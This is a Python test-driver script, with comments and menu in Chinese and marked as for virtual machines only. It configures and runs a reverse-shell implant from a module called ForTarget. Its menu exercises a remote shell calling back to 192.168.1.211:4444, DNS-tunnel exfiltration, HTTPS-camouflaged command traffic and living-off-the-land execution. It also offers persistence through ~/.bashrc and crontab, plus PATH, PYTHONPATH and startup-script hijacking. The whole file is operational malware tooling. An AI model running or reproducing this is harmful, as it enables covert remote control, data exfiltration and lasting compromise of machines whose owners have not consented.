"""
全功能测试脚本 - 仅在虚拟机运行！
会修改系统文件：crontab、~/.bashrc、启动脚本、PATH 等
"""
from ForTarget import (
    EnhancedReverseShell, DNSConfig, HTTPIsConfig, LOTLConfig,
    ScheduleConfig, PayloadConfig, supply_chain_attack_complete,
)

MAC_IP = '192.168.1.211'

shell = EnhancedReverseShell(
    host=MAC_IP,
    port=4444,
    dns_config=DNSConfig(
        domain='test.local',
        resolver=MAC_IP,
        resolver_port=5353,
    ),
    https_config=HTTPIsConfig(
        endpoint='/inject',
        use_tls=False,
        verify_ssl=False,
    ),
    lotl_config=LOTLConfig(
        tools=['curl', 'powershell'],
    ),
    schedule_config=ScheduleConfig(
        interval_seconds=60,
        enable=True,
        cron_schedule='*/1 * * * *',
        crontab_mode='user',    # 用 crontab -，不动 /etc/crontab
    ),
    payload_config=PayloadConfig(
        load_modules=False,
        modify_paths=False,
    ),
)

MENU = """
========== 全功能测试（虚拟机专用）==========
--- 无风险 ---
1. 交互式 Shell 会话
2. DNS 隧道发送
3. DNS 查询
4. HTTPS 伪装请求
5. LOTL 借壳执行命令

--- 会修改系统文件 ---
6. 持久化 - 写入 ~/.bashrc（重启后自动反连）
7. 持久化 - 写入 crontab（定时反连）
8. 供应链 - PATH 劫持（写 /tmp/reverse_shell/bin/python）
9. 供应链 - 设置 PYTHONPATH 环境变量
10. 供应链 - 修改所有启动脚本（.bashrc/.zshrc/.profile 等）
11. 供应链 - 写入 DNS 隧道脚本

0. 退出
=============================================
"""

while True:
    print(MENU)
    choice = input("选择功能: ").strip()

    if choice == '1':
        shell.shell_session()

    elif choice == '2':
        msg = input("输入要通过 DNS 隧道发送的内容: ")
        ok = shell.send_dns_tunnel(msg)
        print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '3':
        result = shell.query_dns()
        print(f"[DNS响应] {result}")

    elif choice == '4':
        msg = input("输入要发送的命令内容: ")
        result = shell.camouflage_https(msg)
        print(f"[HTTPS响应] {result}")

    elif choice == '5':
        cmd = input("输入要借壳执行的命令: ")
        result = shell.run_lotl_command(cmd)
        print(f"[LOTL输出] {result}")

    elif choice == '6':
        print("[警告] 将修改 ~/.bashrc，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = shell.setup_persistence(method='bashrc')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '7':
        print("[警告] 将修改 crontab，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = shell.setup_persistence(method='crontab')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '8':
        print("[警告] 将写入 /tmp/reverse_shell/bin/python，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = supply_chain_attack_complete(shell, attack_type='path')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '9':
        print("[警告] 将设置 PYTHONPATH 环境变量，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = supply_chain_attack_complete(shell, attack_type='env')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '10':
        print("[警告] 将修改 .bashrc/.zshrc/.profile/etc/profile 等，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = supply_chain_attack_complete(shell, attack_type='startup_script')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '11':
        print("[警告] 将写入 /tmp/reverse_shell_dns.py，确认继续？(y/n) ", end='')
        if input().strip().lower() == 'y':
            ok = supply_chain_attack_complete(shell, attack_type='dns')
            print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '0':
        break
    else:
        print("无效输入")
